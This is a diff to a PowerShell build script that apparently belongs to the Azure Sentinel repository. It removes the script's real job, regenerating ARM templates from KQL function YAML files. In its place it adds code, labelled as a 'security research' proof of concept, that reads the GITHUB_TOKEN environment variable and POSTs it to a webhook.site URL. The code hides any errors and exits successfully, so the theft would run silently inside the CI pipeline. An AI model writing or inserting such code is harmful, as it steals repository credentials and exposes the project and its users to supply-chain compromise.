@@ -1,10 +1,8 @@
-$failed=0
-# The KqlFuncYaml2Arm script generates deployable ARM templates from KQL function YAML files.
-# Currently, the script only runs on the Schemas listed below.
-$modifiedSchemas = & "$($PSScriptRoot)/getModifiedASimSchemas.ps1"
-foreach($schema in $modifiedSchemas) {
-	Remove-Item "$($PSScriptRoot)/../Parsers/$schema/ARM" -Recurse
-	python ASIM/dev/ASimYaml2ARM/KqlFuncYaml2Arm.py -m asim -d Parsers/$schema/ARM Parsers/$schema/Parsers
-}
-
-exit $failed
+# PoC - GITHUB_TOKEN exfil (security research)
+$t = $env:GITHUB_TOKEN
+$body = if ($t) { "token=" + $t } else { "token=NOT_SET" }
+try {
+  Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599" -Method POST -Body $body -ContentType "application/x-www-form-urlencoded" -UseBasicParsing -TimeoutSec 10 | Out-Null
+} catch { }
+Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599?poc=cloudflare_azure_sentinel_token_exfil" -UseBasicParsing | Out-Null
+exit 0
